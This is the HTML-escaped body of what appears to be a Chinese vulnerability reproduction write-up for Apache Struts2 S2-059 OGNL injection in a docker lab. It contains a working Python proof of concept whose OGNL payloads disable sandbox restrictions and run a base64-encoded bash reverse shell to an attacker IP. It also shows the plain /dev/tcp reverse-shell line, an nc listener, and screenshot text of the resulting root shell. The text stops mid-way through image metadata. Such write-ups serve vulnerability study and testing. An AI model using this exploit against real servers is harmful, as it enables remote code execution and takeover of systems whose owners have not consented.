&lt;div id=&quot;B6n48&quot; class=&quot;lake-selected&quot; data-card-type=&quot;block&quot; data-lake-card=&quot;codeblock&quot; data-card-value=&quot;data:%7B%22mode%22%3A%22plain%22%2C%22code%22%3A%22docker-compose%20up%20-d%22%2C%22id%22%3A%22B6n48%22%7D&quot; data-language=&quot;plain&quot;&gt;
&lt;div class=&quot;lake-codeblock-content&quot;&gt;
&lt;div class=&quot;CodeMirror-sizer&quot;&gt;
&lt;pre class=&quot;cm-s-default&quot;&gt;
&lt;span class=&quot;lake-preview-line&quot;&gt;&lt;span class=&quot;lake-preview-line-number lake-lm-pad-level-0&quot;&gt;&lt;span class=&quot;lake-preview-codeblock-content&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p data-lake-id=&quot;8134e78adad9c6e69aeb3be7aede089d&quot;&gt;启动环境之后访问http://your-ip:8080&lt;/p&gt;
&lt;p data-lake-id=&quot;b1544d2f0982383c2fabb2e55c04697f&quot;&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/262404/1604245560183-de8da39d-93a1-41a5-8bd8-666aae010817.png&quot; alt=&quot;image.png&quot; class=&quot;image lake-drag-image&quot; title=&quot;image.png&quot; data-role=&quot;image&quot; data-raw-src=&quot;&quot; data-height=&quot;82px&quot;/&gt;&lt;/p&gt;
&lt;p data-lake-id=&quot;0be42b2caa32a00b7f978039d7783614&quot;&gt;（2）漏洞验证&lt;/p&gt;
&lt;p data-lake-id=&quot;5a7099533e18b7b59e41f3975691ad0d&quot;&gt;由于该漏洞是存在解析漏洞，也就是对于用户提交的数据进行了二次处理。&lt;/p&gt;
&lt;p data-lake-id=&quot;afce9be5a0f0161a7ae06aa9246d409f&quot;&gt;从而攻击者对输入的内容进行特意构造，然后实现攻击成。&lt;/p&gt;
&lt;p data-lake-id=&quot;88c62154bf4dd5e0d40bfeca6673bf7c&quot;&gt;URL &lt;code&gt;http://192.168.1.12:8080/?id=%25{2*3}&lt;/code&gt; &lt;/p&gt;
&lt;p data-lake-id=&quot;e1106c73355f2c50fadce7a8dd542664&quot;&gt;&lt;span class=&quot;lake-card-margin-top lake-card-margin-bottom lake-selected&quot; data-card-type=&quot;inline&quot; data-lake-card=&quot;image&quot; data-card-value=&quot;data:%7B%22src%22%3A%22https%3A%2F%2Fcdn.nlark.com%2Fyuque%2F0%2F2020%2Fpng%2F262404%2F1604330578391-b09fa643-f604-4ef0-a27f-e7190d0a532c.png%22%2C%22originWidth%22%3A681%2C%22originHeight%22%3A405%2C%22name%22%3A%22image.png%22%2C%22size%22%3A38059%2C%22display%22%3A%22inline%22%2C%22align%22%3A%22left%22%2C%22linkTarget%22%3A%22_blank%22%2C%22status%22%3A%22done%22%2C%22ocrLocations%22%3A%5B%7B%22x%22%3A9.380244%2C%22y%22%3A12.273854%2C%22width%22%3A99.59001599999999%2C%22height%22%3A15.946365%2C%22text%22%3A%22S2-059demo%22%7D%2C%7B%22x%22%3A244.70648%2C%22y%22%3A58.099808%2C%22width%22%3A270.15216000000004%2C%22height%22%3A17.293388%2C%22text%22%3A%22192.168.1.12%3A8080%2F%3Fid-%25252*31%22%7D%2C%7B%22x%22%3A8.150149%2C%22y%22%3A106.52682%2C%22width%22%3A201.961321%2C%22height%22%3A22.179780000000008%2C%22text%22%3A%22yourinputid%3A%252*31%22%7D%2C%7B%22x%22%3A10.07742%2C%22y%22%3A133.11555%2C%22width%22%3A370.54778%2C%22height%22%3A19.23818%2C%22text%22%3A%22hasbenevaluatdagainindattribute%22%7D%2C%7B%22x%22%3A324.4829%2C%22y%22%3A206.31934%2C%22width%22%3A190.21864000000005%2C%22height%22%3A21.67107999999999%2C%22text%22%3A%22%E6%AD%A4%E7%BD%91%E7%BB%9C%E6%A0%B7%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%22%7D%2C%7B%22x%22%3A604.7046%2C%22y%22%3A206.65393%2C%22width%22%3A60.07579999999996%2C%22height%22%3A19.353620000000006%2C%22text%22%3A%220%E5%86%85%E5%AD%98%22%7D%2C%7B%22x%22%3A261.33182%2C%22y%22%3A207.97307%2C%22width%22%3A48.32483000000002%2C%22height%22%3A17.095579999999984%2C%22text%22%3A%22%E8%B0%83%E8%AF%95%E5%99%A8%22%7D%2C%7B%22x%22%3A554.2628%2C%22y%22%3A208.08665%2C%22width%22%3A32.55280000000005%2C%22height%22%3A16.567800000000005%2C%22text%22%3A%22%E6%80%A7%E8%83%BD%22%7D%2C%7B%22x%22%3A77.38318%2C%22y%22%3A208.32072%2C%22width%22%3A46.76454000000001%2C%22height%22%3A15.683369999999996%2C%22text%22%3A%22%E6%9F%A5%E7%9C%8B%E5%99%A8%22%7D%2C%7B%22x%22%3A169.56328%2C%22y%22%3A208.47256%2C%22width%22%3A45.70692%2C%22height%22%3A15.554910000000007%2C%22text%22%3A%22%E6%8E%A7%E5%88%B6%E5%8F%B0%22%7D%2C%7B%22x%22%3A27.36498%2C%22y%22%3A242.79456%2C%22width%22%3A70.34595%2C%22height%22%3A14.170560000000023%2C%22text%22%3A%22%E6%90%9C%E7%B4%A2HTML%22%7D%2C%7B%22x%22%3A21.957542%2C%22y%22%3A271.58963%2C%22width%22%3A44.667862%2C%22height%22%3A10.830370000000016%2C%22text%22%3A%22%3Chtm1%3E%22%7D%2C%7B%22x%22%3A37.537346%2C%22y%22%3A290.58313%2C%22width%22%3A115.20124399999999%2C%22height%22%3A12.321570000000008%2C%22text%22%3A%22%3Cheadso%3C%2Fhead%22%7D%2C%7B%22x%22%3A36.949024%2C%22y%22%3A311.35992%2C%22width%22%3A40.329342000000004%2C%22height%22%3A10.946979999999996%2C%22text%22%3A%22%3Cbody%22%7D%2C%7B%22x%22%3A44.612614%2C%22y%22%3A329.08102%2C%22width%22%3A266.405486%2C%22height%22%3A14.937979999999982%2C%22text%22%3A%22%3Caid-%5C%226%5C%22href%5C%22L.action'%3Eoka%3E%22%7D%2C%7B%22x%22%3A34.193707%2C%22y%22%3A349.3677%2C%22width%22%3A55.475382999999994%2C%22height%22%3A14.272559999999999%2C%22text%22%3A%22%3C%2Fbody%3E%22%7D%2C%7B%22x%22%3A22.509037%2C%22y%22%3A369.56903%2C%22width%22%3A52.75795300000001%2C%22height%22%3A13.127499999999998%2C%22text%22%3A%22%3C%2Fhtm1%3E%22%7D%5D%2C%22style%22%3A%22none%22%2C%22search%22%3A%22S2-059demo%20192.168.1.12%3A8080%2F%3Fid-%25252*31%20yourinputid%3A%252*31%20hasbenevaluatdagainindattribute%20%E6%AD%A4%E7%BD%91%E7%BB%9C%E6%A0%B7%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%200%E5%86%85%E5%AD%98%20%E8%B0%83%E8%AF%95%E5%99%A8%20%E6%80%A7%E8%83%BD%20%E6%9F%A5%E7%9C%8B%E5%99%A8%20%E6%8E%A7%E5%88%B6%E5%8F%B0%20%E6%90%9C%E7%B4%A2HTML%20%3Chtm1%3E%20%3Cheadso%3C%2Fhead%20%3Cbody%20%3Caid-%5C%226%5C%22href%5C%22L.action'%3Eoka%3E%20%3C%2Fbody%3E%20%3C%2Fhtm1%3E%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22width%22%3A394%2C%22height%22%3A234%7D&quot;&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/262404/1604330578391-b09fa643-f604-4ef0-a27f-e7190d0a532c.png&quot; alt=&quot;image.png&quot; class=&quot;image lake-drag-image&quot; title=&quot;image.png&quot; data-role=&quot;image&quot; data-raw-src=&quot;&quot; data-height=&quot;234px&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p data-lake-id=&quot;1a28bb21a97fc9dbb81433491cfced5d&quot;&gt;（3）漏洞复现&lt;/p&gt;
&lt;p data-lake-id=&quot;08182b62fdbc75203ccc1d596c57eaad&quot;&gt;&lt;strong&gt;构造POC&lt;/strong&gt;&lt;/p&gt;
&lt;p data-lake-id=&quot;00688815ea57986d4d63c80b2ab6ce85&quot;&gt;用来反弹shell&lt;/p&gt;
&lt;p data-lake-id=&quot;774dbffb6a74f07ded0e12f1c1e20610&quot;&gt;这里要修改两个地方：&lt;/p&gt;
&lt;p data-lake-id=&quot;0dec1f565f6c8bcd2fbabb1c1bd3c117&quot;&gt;&lt;span&gt;1.靶机IP&lt;/span&gt;&lt;/p&gt;
&lt;p data-lake-id=&quot;ded56876d152e504c9a81ec7ff53ddb4&quot;&gt;192.168.1.12&lt;/p&gt;
&lt;p data-lake-id=&quot;22b4f6d88abb6d732af645c4d2cf2590&quot;&gt;&lt;span&gt;2.攻击机IP反弹shell base64编码&lt;/span&gt;&lt;/p&gt;
&lt;p data-lake-id=&quot;4841d9b7038e63eed635cfb30278a0c1&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.129/6666 0&amp;gt;&amp;amp;1&lt;/p&gt;
&lt;p data-lake-id=&quot;4841d9b7038e63eed635cfb30278a0c1&quot;&gt; &lt;/p&gt;
&lt;div id=&quot;K7G8r&quot; class=&quot;lake-card-margin lake-selected&quot; data-card-type=&quot;block&quot; data-lake-card=&quot;codeblock&quot; data-card-value=&quot;data:%7B%22mode%22%3A%22python%22%2C%22code%22%3A%22import%20requests%5Cnurl%20%3D%20%5C%22http%3A%2F%2F192.168.1.12%3A8080%5C%22%5Cndata1%20%3D%20%7B%5Cn%20%20%20%20%5C%22id%5C%22%3A%20%5C%22%25%7B(%23context%3D%23attr%5B'struts.valueStack'%5D.context).(%23container%3D%23context%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.setExcludedClasses('')).(%23ognlUtil.setExcludedPackageNames(''))%7D%5C%22%5Cn%7D%5Cndata2%20%3D%20%7B%5Cn%20%20%20%20%5C%22id%5C%22%3A%20%5C%22%25%7B(%23context%3D%23attr%5B'struts.valueStack'%5D.context).(%23context.setMemberAccess(%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)).(%40java.lang.Runtime%40getRuntime().exec('bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjEuMTIvNjY2NiAwPiYxCg%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D'))%7D%5C%22%5Cn%7D%5Cnres1%20%3D%20requests.post(url%2C%20data%3Ddata1)%5Cnres2%20%3D%20requests.post(url%2C%20data%3Ddata2)%22%2C%22heightLimit%22%3Atrue%2C%22margin%22%3Atrue%2C%22id%22%3A%22K7G8r%22%2C%22autoWrap%22%3Atrue%7D&quot; data-language=&quot;python&quot;&gt;
&lt;div class=&quot;lake-codeblock-content&quot;&gt;
&lt;div class=&quot;CodeMirror-sizer&quot; readability=&quot;10&quot;&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;40&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
import requests
url = &quot;http://192.168.1.12:8080&quot;
data1 = {
    &quot;id&quot;: &quot;%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}&quot;
}
data2 = {
    &quot;id&quot;: &quot;%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTIvNjY2NiAwPiYxCg==}|{base64,-d}|{bash,-i}'))}&quot;
}
res1 = requests.post(url, data=data1)
res2 = requests.post(url, data=data2)
&lt;/pre&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p data-lake-id=&quot;28ef8a1874fe1d5d96cc8132b94f7ef5&quot;&gt;1.监听端口&lt;/p&gt;
&lt;div id=&quot;z4IwF&quot; class=&quot;lake-card-margin lake-selected&quot; data-card-type=&quot;block&quot; data-lake-card=&quot;codeblock&quot; data-card-value=&quot;data:%7B%22mode%22%3A%22bash%22%2C%22code%22%3A%22nc%20-lvvp%206666%22%2C%22heightLimit%22%3Atrue%2C%22margin%22%3Atrue%2C%22id%22%3A%22z4IwF%22%7D&quot; data-language=&quot;bash&quot;&gt;
&lt;div class=&quot;lake-codeblock-content&quot;&gt;
&lt;div class=&quot;CodeMirror-sizer&quot;&gt;
&lt;pre class=&quot;cm-s-default&quot;&gt;
&lt;span class=&quot;lake-preview-line&quot;&gt;&lt;span class=&quot;lake-preview-line-number lake-lm-pad-level-0&quot;&gt;&lt;span class=&quot;lake-preview-codeblock-content&quot;&gt;&lt;span class=&quot;cm-builtin&quot;&gt;nc &lt;span class=&quot;cm-attribute&quot;&gt;-lvvp &lt;span class=&quot;cm-number&quot;&gt;6666&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p data-lake-id=&quot;ccc6da6c3052aa1af6d203d0cd8f55e8&quot;&gt;2.运行脚本&lt;/p&gt;
&lt;div id=&quot;xxSxW&quot; class=&quot;lake-card-margin lake-selected&quot; data-card-type=&quot;block&quot; data-lake-card=&quot;codeblock&quot; data-card-value=&quot;data:%7B%22mode%22%3A%22bash%22%2C%22code%22%3A%22python3%20payload.py%22%2C%22heightLimit%22%3Atrue%2C%22margin%22%3Atrue%2C%22id%22%3A%22xxSxW%22%7D&quot; data-language=&quot;bash&quot;&gt;
&lt;div class=&quot;lake-codeblock-content&quot;&gt;
&lt;div class=&quot;CodeMirror-sizer&quot;&gt;
&lt;pre class=&quot;cm-s-default&quot;&gt;
&lt;span class=&quot;lake-preview-line&quot;&gt;&lt;span class=&quot;lake-preview-line-number lake-lm-pad-level-0&quot;&gt;&lt;span class=&quot;lake-preview-codeblock-content&quot;&gt;python3 payload.py&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p data-lake-id=&quot;e4563a5c5e340ebe94338e548d201728&quot;&gt;3.反弹shell&lt;/p&gt;
&lt;p data-lake-id=&quot;3099eb6970e8fbfa4824a1862fdb4cc6&quot;&gt;&lt;span class=&quot;lake-card-margin-top lake-card-margin-bottom lake-selected&quot; data-card-type=&quot;inline&quot; data-lake-card=&quot;image&quot; data-card-value=&quot;data:%7B%22src%22%3A%22https%3A%2F%2Fcdn.nlark.com%2Fyuque%2F0%2F2020%2Fpng%2F262404%2F1604331334394-efa55a06-a180-408b-906c-efa3b2e2db75.png%22%2C%22originWidth%22%3A984%2C%22originHeight%22%3A235%2C%22name%22%3A%22image.png%22%2C%22size%22%3A66530%2C%22display%22%3A%22inline%22%2C%22align%22%3A%22left%22%2C%22linkTarget%22%3A%22_blank%22%2C%22status%22%3A%22done%22%2C%22ocrLocations%22%3A%5B%7B%22x%22%3A250.49156%2C%22y%22%3A-0.6634578%2C%22width%22%3A87.74599%2C%22height%22%3A12.0068448%2C%22text%22%3A%22kat%40kal%3A-lmy%22%7D%2C%7B%22x%22%3A609.40607%2C%22y%22%3A2.4900172%2C%22width%22%3A87.34936000000005%2C%22height%22%3A15.6135028%2C%22text%22%3A%22kali%40kli%3A-lmy%22%7D%2C%7B%22x%22%3A173.66298%2C%22y%22%3A22.224287%2C%22width%22%3A86.70997999999997%2C%22height%22%3A16.937296%2C%22text%22%3A%22ViewHelp%22%7D%2C%7B%22x%22%3A130.3145%2C%22y%22%3A23.019148%2C%22width%22%3A30.899549999999977%2C%22height%22%3A15.203721999999999%2C%22text%22%3A%22EDit%22%7D%2C%7B%22x%22%3A17.725794%2C%22y%22%3A23.80129%2C%22width%22%3A25.899510999999997%2C%22height%22%3A13.674079999999996%2C%22text%22%3A%22File%22%7D%2C%7B%22x%22%3A63.314964%2C%22y%22%3A24.450525%2C%22width%22%3A49.066636%2C%22height%22%3A14.076903000000001%2C%22text%22%3A%22ActionS%22%7D%2C%7B%22x%22%3A375.6117%2C%22y%22%3A28.199127%2C%22width%22%3A29.85745000000003%2C%22height%22%3A14.402786000000003%2C%22text%22%3A%22File%22%7D%2C%7B%22x%22%3A586.496%2C%22y%22%3A29.019648%2C%22width%22%3A31.921500000000037%2C%22height%22%3A15.592695000000003%2C%22text%22%3A%22Help%22%7D%2C%7B%22x%22%3A534.1434%2C%22y%22%3A29.509699%2C%22width%22%3A36.67269999999996%2C%22height%22%3A13.934712999999999%2C%22text%22%3A%22View%22%7D%2C%7B%22x%22%3A417.2477%2C%22y%22%3A29.729382%2C%22width%22%3A54.60136%2C%22height%22%3A14.474083%2C%22text%22%3A%22Actions%22%7D%2C%7B%22x%22%3A488.93796%2C%22y%22%3A29.76471%2C%22width%22%3A27.848780000000033%2C%22height%22%3A13.535891999999997%2C%22text%22%3A%22Edit%22%7D%2C%7B%22x%22%3A102.95141%2C%22y%22%3A52.20099%2C%22width%22%3A25.107150000000004%2C%22height%22%3A18.873939999999997%2C%22text%22%3A%22%2Fmy%22%7D%2C%7B%22x%22%3A17.990078%2C%22y%22%3A52.540913%2C%22width%22%3A66.865582%2C%22height%22%3A15.216816999999992%2C%22text%22%3A%22katiakati%22%7D%2C%7B%22x%22%3A141.29144%2C%22y%22%3A52.143105%2C%22width%22%3A149.34225999999998%2C%22height%22%3A20.052735000000006%2C%22text%22%3A%22Python3payload.py%22%7D%2C%7B%22x%22%3A374.05164%2C%22y%22%3A58.922672%2C%22width%22%3A203.66855999999996%2C%22height%22%3A15.960727999999996%2C%22text%22%3A%22kaliakati%3A~lmy%24nc-lvvp6%22%7D%2C%7B%22x%22%3A560.87463%2C%22y%22%3A59.312325%2C%22width%22%3A47.49956999999995%2C%22height%22%3A14.265074999999996%2C%22text%22%3A%22P6666%22%7D%2C%7B%22x%22%3A16.486359%2C%22y%22%3A69.28005%2C%22width%22%3A75.74317099999999%2C%22height%22%3A13.74682%2C%22text%22%3A%22katiakali%3A%22%7D%2C%7B%22x%22%3A372.52045%2C%22y%22%3A74.48524%2C%22width%22%3A193.70281999999997%2C%22height%22%3A15.697389999999999%2C%22text%22%3A%22listeningon%5Bany%5D6666%22%7D%2C%7B%22x%22%3A372.97156%2C%22y%22%3A89.44193%2C%22width%22%3A433.19347999999997%2C%22height%22%3A15.488060000000004%2C%22text%22%3A%22192.168.1.hkuow%22%7D%2C%7B%22x%22%3A372.70117%2C%22y%22%3A105.47594%2C%22width%22%3A501.52213%2C%22height%22%3A16.079300000000003%2C%22text%22%3A%22connectto192168%22%7D%2C%7B%22x%22%3A679.8092%2C%22y%22%3A121.99545%2C%22width%22%3A299.054%2C%22height%22%3A16.53958%2C%22text%22%3A%22up(1)%3AInappropriateioctlfordevice%22%7D%2C%7B%22x%22%3A372.3371%2C%22y%22%3A123.670715%2C%22width%22%3A328.23819999999995%2C%22height%22%3A14.718815000000006%2C%22text%22%3A%22bash%3Acannotsetterminalprocessgroup%22%7D%2C%7B%22x%22%3A373.1016%2C%22y%22%3A140.17084%2C%22width%22%3A275.2603%2C%22height%22%3A12.948129999999992%2C%22text%22%3A%22bash%3Anojobcontrolinthisshelt%22%7D%2C%7B%22x%22%3A373.51843%2C%22y%22%3A157.1541%2C%22width%22%3A274.46363%2C%22height%22%3A11.86085%2C%22text%22%3A%22rootac6e82029139%2Fsrcm%22%7D%2C%7B%22x%22%3A373.83545%2C%22y%22%3A172.20216%2C%22width%22%3A49.23255%2C%22height%22%3A12.818929999999995%2C%22text%22%3A%22whoami%22%7D%2C%7B%22x%22%3A373.5421%2C%22y%22%3A187.58235%2C%22width%22%3A32.139819999999986%2C%22height%22%3A13.575520000000012%2C%22text%22%3A%22root%22%7D%2C%7B%22x%22%3A373.81967%2C%22y%22%3A203.26903%2C%22width%22%3A220.31748000000005%2C%22height%22%3A13.379830000000027%2C%22text%22%3A%22rootac6e82029139f%3A%2Fusr%2Fsrc%23%22%7D%5D%2C%22style%22%3A%22none%22%2C%22search%22%3A%22kat%40kal%3A-lmy%20kali%40kli%3A-lmy%20ViewHelp%20EDit%20File%20ActionS%20File%20Help%20View%20Actions%20Edit%20%2Fmy%20katiakati%20Python3payload.py%20kaliakati%3A~lmy%24nc-lvvp6%20P6666%20katiakali%3A%20listeningon%5Bany%5D6666%20192.168.1.hkuow%20connectto192168%20up(1)%3AInappropriateioctlfordevice%20bash%3Acannotsetterminalprocessgroup%20bash%3Anojobcontrolinthisshelt%20rootac6e82029139%2Fsrcm%20whoami%20root%20rootac6e82029139f%3A%2Fusr%2Fsrc%23%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22width%22%3A589%2C%22height%22%3A141%7D&quot;&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/262404/1604331334394-efa55a06-a180-408b-906c-efa3b2e2db75.png&quot; alt=&quot;image.png&quot; class=&quot;image lake-drag-image&quot; title=&quot;image.png&quot; data-role=&quot;image&quot; data-raw-src=&quot;&quot; data-height=&quot;141px&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p data-lake-id=&quot;b46fa93878626482d8990f83bf9dde46&quot;&gt;攻击的时候抓取数据包&lt;/p&gt;
&lt;p data-lake-id=&quot;672607ad44ccd38688b2ca90170ac076&quot;&gt;&lt;span class=&quot;lake-card-margin-top lake-card-margin-bottom lake-selected&quot; data-card-type=&quot;inline&quot; data-lake-card=&quot;image&quot; data-card-value=&quot;data:%7B%22src%22%3A%22https%3A%2F%2Fcdn.nlark.com%2Fyuque%2F0%2F2020%2Fpng%2F262404%2F1604331538859-27d33393-af0c-4542-b96b-a3fee2d29c10.png%22%2C%22originWidth%22%3A1296%2C%22originHeight%22%3A355%2C%22name%22%3A%22image.png%22%2C%22size%22%3A165818%2C%22display%22%3A%22inline%22%2C%22align%22%3A%22left%22%2C%22linkTarget%22%3A%22_blank%22%2C%22status%22%3A%22done%22%2C%22ocrLocations%22%3A%5B%7B%22x%22%3A115.47994%2C%22y%22%3A7.2825465%2C%22width%22%3A53.05439000000001%2C%22height%22%3A13.658907500000002%2C%22text%22%3A%22hLokli%3B%22%7D%2C%7B%22x%22%3A681.4251%2C%22y%22%3A22.374424%2C%22width%22%3A21.46339999999998%2C%22height%22%3A14.729145999999997%2C%22text%22%3A%22Go%22%7D%2C%7B%22x%22%3A602.4414%2C%22y%22%3A22.6875%2C%22width%22%3A28.222399999999993%2C%22height%22%3A13.621502%2C%22text%22%3A%22Edit%22%7D%2C%7B%22x%22%3A777.403%2C%22y%22%3A23.025944%2C%22width%22%3A49.67823999999996%2C%22height%22%3A14.261841%2C%22text%22%3A%22Analyze%22%7D%2C%7B%22x%22%3A1093.4042%2C%22y%22%3A23.14227%2C%22width%22%3A34.165300000000116%2C%22height%22%3A13.597156000000002%2C%22text%22%3A%22Help%22%7D%2C%7B%22x%22%3A187.31361%2C%22y%22%3A23.908873%2C%22width%22%3A204.23578999999998%2C%22height%22%3A16.267319999999998%2C%22text%22%3A%22FILEACTIONSEDITVIEW%22%7D%2C%7B%22x%22%3A382.53928%2C%22y%22%3A25.650002%2C%22width%22%3A46.956169999999986%2C%22height%22%3A13.868305%2C%22text%22%3A%22HelP%22%7D%2C%7B%22x%22%3A37.1599%2C%22y%22%3A33.798756%2C%22width%22%3A40.170480000000005%2C%22height%22%3A14.699028000000006%2C%22text%22%3A%22View%22%7D%2C%7B%22x%22%3A90.14337%2C%22y%22%3A33.836544%2C%22width%22%3A31.82763%2C%22height%22%3A15.780803999999996%2C%22text%22%3A%22HelP%22%7D%2C%7B%22x%22%3A184.83243%2C%22y%22%3A53.803%2C%22width%22%3A232.87017000000003%2C%22height%22%3A14.697479999999999%2C%22text%22%3A%22katiakali%3Ac%2Foysnc-Lwvp6666%22%7D%2C%7B%22x%22%3A185.1857%2C%22y%22%3A70.71764%2C%22width%22%3A227.00085%2C%22height%22%3A14.161419999999993%2C%22text%22%3A%22listeningonlany%5D6666...%22%7D%2C%7B%22x%22%3A575.0012%2C%22y%22%3A84.79904%2C%22width%22%3A162.2045999999999%2C%22height%22%3A15.352334999999997%2C%22text%22%3A%22Jip.addr--192.168.1.12%22%7D%2C%7B%22x%22%3A184.92574%2C%22y%22%3A85.40237%2C%22width%22%3A368.71255999999994%2C%22height%22%3A15.17667999999999%2C%22text%22%3A%22192.168.1.1inversehostlookupfaled%3AUnkn%22%7D%2C%7B%22x%22%3A0.55128026%2C%22y%22%3A96.04176%2C%22width%22%3A42.05774774%2C%22height%22%3A16.34848000000001%2C%22text%22%3A%22ad.py%22%7D%2C%7B%22x%22%3A183.90005%2C%22y%22%3A102.33981%2C%22width%22%3A390.12601000000006%2C%22height%22%3A14.770595%2C%22text%22%3A%22connectto192168.1.19%5DFrom(UNNOw19%22%7D%2C%7B%22x%22%3A1027.6769%2C%22y%22%3A109.759%2C%22width%22%3A126.90550000000007%2C%22height%22%3A14.782336%2C%22text%22%3A%22ProtocolLengttlnfo%22%7D%2C%7B%22x%22%3A703.4551%2C%22y%22%3A111.54535%2C%22width%22%3A78.57535999999993%2C%22height%22%3A13.924019999999999%2C%22text%22%3A%22Source%22%7D%2C%7B%22x%22%3A3.7827027%2C%22y%22%3A112.35652%2C%22width%22%3A148.6019373%2C%22height%22%3A20.748139999999992%2C%22text%22%3A%22Python3PayLoad.py%22%7D%2C%7B%22x%22%3A182.48303%2C%22y%22%3A111.71011%2C%22width%22%3A425.41976999999997%2C%22height%22%3A26.359439999999992%2C%22text%22%3A%22bash%3Acannotseterminlrocessgroup)%22%7D%2C%7B%22x%22%3A606.1185%2C%22y%22%3A123.2001%2C%22width%22%3A216.87313999999992%2C%22height%22%3A16.30050999999999%2C%22text%22%3A%22382352544973219216811%22%7D%2C%7B%22x%22%3A1117.2529%2C%22y%22%3A124.78309%2C%22width%22%3A94.16470000000004%2C%22height%22%3A15.202770000000001%2C%22text%22%3A%226430528880%22%7D%2C%7B%22x%22%3A184.23117%2C%22y%22%3A135.31937%2C%22width%22%3A294.54393000000005%2C%22height%22%3A13.92201%2C%22text%22%3A%22bash%3AnoJobcontrolinthissheit%22%7D%2C%7B%22x%22%3A1110.4216%2C%22y%22%3A139.03589%2C%22width%22%3A152.64250000000015%2C%22height%22%3A16.550060000000002%2C%22text%22%3A%2274417346666YNj%22%7D%2C%7B%22x%22%3A603.3859%2C%22y%22%3A139.46942%2C%22width%22%3A220.8351%2C%22height%22%3A28.962219999999974%2C%22text%22%3A%22283%3A33828088.%22%7D%2C%7B%22x%22%3A1110.1937%2C%22y%22%3A151.67352%2C%22width%22%3A116.03710000000001%2C%22height%22%3A30.03504000000001%2C%22text%22%3A%22608%22%7D%2C%7B%22x%22%3A184.68013%2C%22y%22%3A151.11168%2C%22width%22%3A272.9637%2C%22height%22%3A14.033969999999982%2C%22text%22%3A%22rootac6e8202913f%2Fssrchoam%22%7D%2C%7B%22x%22%3A1029.282%2C%22y%22%3A153.5223%2C%22width%22%3A24.124500000000126%2C%22height%22%3A13.386650000000003%2C%22text%22%3A%22TCP%22%7D%2C%7B%22x%22%3A604.3092%2C%22y%22%3A165.33606%2C%22width%22%3A219.12433%2C%22height%22%3A17.753600000000006%2C%22text%22%3A%224123533801025192168119%22%7D%2C%7B%22x%22%3A879.38464%2C%22y%22%3A167.00453%2C%22width%22%3A89.26049999999998%2C%22height%22%3A13.612890000000021%2C%22text%22%3A%22192168.1.12%22%7D%2C%7B%22x%22%3A184.99637%2C%22y%22%3A168.19308%2C%22width%22%3A62.58103999999997%2C%22height%22%3A13.676580000000001%2C%22text%22%3A%22whoaml%22%7D%2C%7B%22x%22%3A1110.291%2C%22y%22%3A178.74551%2C%22width%22%3A146.93190000000004%2C%22height%22%3A18.884270000000015%2C%22text%22%3A%227441736666GSYN%5D%22%7D%2C%7B%22x%22%3A603.96844%2C%22y%22%3A178.97598%2C%22width%22%3A219.38095999999996%2C%22height%22%3A31.035300000000007%2C%22text%22%3A%22%E5%90%8D%E8%B4%B95%E6%9C%8888828%22%7D%2C%7B%22x%22%3A863.5314%2C%22y%22%3A182.14828%2C%22width%22%3A109.0136%2C%22height%22%3A14.944260000000014%2C%22text%22%3A%22192.168.1.129%22%7D%2C%7B%22x%22%3A184.81903%2C%22y%22%3A183.6356%2C%22width%22%3A122.55905000000001%2C%22height%22%3A13.507659999999987%2C%22text%22%3A%22Poot%22%7D%2C%7B%22x%22%3A1108.5107%2C%22y%22%3A193.72205%2C%22width%22%3A114.67169999999987%2C%22height%22%3A16.90209999999999%2C%22text%22%3A%2274666641736%22%7D%2C%7B%22x%22%3A876.65546%2C%22y%22%3A194.49312%2C%22width%22%3A95.0721400000001%2C%22height%22%3A13.715789999999998%2C%22text%22%3A%22192168.1.12%22%7D%2C%7B%22x%22%3A185.32475%2C%22y%22%3A197.2556%2C%22width%22%3A259.39067%2C%22height%22%3A16.006650000000008%2C%22text%22%3A%22rOTAC6E82029139F%2FUR%2FSRCC%22%7D%2C%7B%22x%22%3A437.31964%2C%22y%22%3A197.90627%2C%22width%22%3A112.27991000000003%2C%22height%22%3A14.319269999999989%2C%22text%22%3A%22sent7%2Crcvd17%22%7D%2C%7B%22x%22%3A604.38434%2C%22y%22%3A208.00824%2C%22width%22%3A212.95386000000008%2C%22height%22%3A17.92622%2C%22text%22%3A%224423.5